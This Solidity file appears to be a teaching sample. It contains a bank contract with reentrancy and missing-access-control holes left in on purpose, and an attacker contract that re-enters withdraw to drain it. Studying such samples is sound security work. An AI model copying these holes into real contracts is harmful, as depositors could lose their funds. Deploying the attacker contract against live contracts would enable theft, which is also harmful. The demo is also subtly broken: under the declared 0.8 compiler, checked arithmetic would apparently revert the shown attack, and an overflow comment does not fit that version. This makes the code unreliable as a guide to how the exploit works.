// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title VulnerableBank - Classic Reentrancy Vulnerability
 * @dev This contract demonstrates the famous reentrancy vulnerability
 * Similar to the DAO hack that cost $50 million in 2016
 *
 * VULNERABILITY: External call before state change allows reentrancy
 * IMPACT: Attacker can drain the entire contract balance
 * CWE-841: Improper Enforcement of Behavioral Workflow
 */

contract VulnerableBank {
    mapping(address => uint256) public balances;
    uint256 public totalDeposits;

    event Deposit(address indexed user, uint256 amount);
    event Withdrawal(address indexed user, uint256 amount);

    /**
     * @dev Deposit Ether into the contract
     */
    function deposit() external payable {
        require(msg.value > 0, "Must deposit something");
        balances[msg.sender] += msg.value;
        totalDeposits += msg.value;
        emit Deposit(msg.sender, msg.value);
    }

    /**
     * @dev Withdraw Ether from the contract
     * VULNERABLE: External call before state update
     *
     * Attack scenario:
     * 1. Attacker calls withdraw() with their balance
     * 2. Contract sends Ether to attacker's fallback function
     * 3. Attacker's fallback function calls withdraw() again
     * 4. Balance hasn't been updated yet, so check passes
     * 5. Process repeats until contract is drained
     */
    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        require(amount > 0, "Amount must be positive");
        require(address(this).balance >= amount, "Contract has insufficient balance");

        // VULNERABILITY: External call before state change
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");

        // State change AFTER external call - allows reentrancy
        balances[msg.sender] -= amount;
        totalDeposits -= amount;

        emit Withdrawal(msg.sender, amount);
    }

    /**
     * @dev Emergency withdraw all funds (admin only)
     * VULNERABLE: No access control modifier
     */
    function emergencyWithdraw() external {
        // VULNERABILITY: Missing onlyOwner or access control
        uint256 contractBalance = address(this).balance;
        (bool success, ) = msg.sender.call{value: contractBalance}("");
        require(success, "Emergency withdrawal failed");
    }

    /**
     * @dev Get contract balance
     */
    function getContractBalance() external view returns (uint256) {
        return address(this).balance;
    }

    /**
     * @dev Get user balance
     */
    function getUserBalance(address user) external view returns (uint256) {
        return balances[user];
    }

    /**
     * @dev Batch withdraw for multiple users
     * VULNERABLE: Potential DoS and reentrancy in loop
     */
    function batchWithdraw(address[] calldata users, uint256[] calldata amounts) external {
        require(users.length == amounts.length, "Arrays length mismatch");

        for (uint256 i = 0; i < users.length; i++) {
            require(balances[users[i]] >= amounts[i], "Insufficient balance");

            // VULNERABILITY: External call in loop + reentrancy
            (bool success, ) = users[i].call{value: amounts[i]}("");
            require(success, "Transfer failed");

            balances[users[i]] -= amounts[i];
        }
    }

    /**
     * @dev Transfer between users
     * VULNERABLE: Integer overflow in older Solidity versions
     */
    function transfer(address to, uint256 amount) external {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        require(to != address(0), "Invalid recipient");

        // In Solidity < 0.8.0, these could overflow/underflow
        balances[msg.sender] -= amount;
        balances[to] += amount;  // Potential overflow
    }

    /**
     * @dev Fallback function to receive Ether
     * Note: This doesn't prevent reentrancy attacks
     */
    receive() external payable {
        balances[msg.sender] += msg.value;
        totalDeposits += msg.value;
    }
}

/**
 * @title ReentrancyAttacker - Example attack contract
 * @dev This contract demonstrates how to exploit the reentrancy vulnerability
 * FOR EDUCATIONAL PURPOSES ONLY - DO NOT USE MALICIOUSLY
 */
contract ReentrancyAttacker {
    VulnerableBank public target;
    uint256 public attackAmount;

    constructor(address _target) {
        target = VulnerableBank(_target);
    }

    /**
     * @dev Start the reentrancy attack
     */
    function attack() external payable {
        require(msg.value > 0, "Need Ether to attack");
        attackAmount = msg.value;

        // First, deposit to establish a balance
        target.deposit{value: msg.value}();

        // Then start the withdrawal attack
        target.withdraw(msg.value);
    }

    /**
     * @dev Fallback function that performs reentrancy
     * This is called when VulnerableBank sends Ether
     */
    fallback() external payable {
        if (address(target).balance >= attackAmount) {
            // Recursively call withdraw while contract still has funds
            target.withdraw(attackAmount);
        }
    }

    /**
     * @dev Withdraw stolen funds
     */
    function withdraw() external {
        (bool success, ) = msg.sender.call{value: address(this).balance}("");
        require(success, "Withdrawal failed");
    }

    /**
     * @dev Get attacker contract balance
     */
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}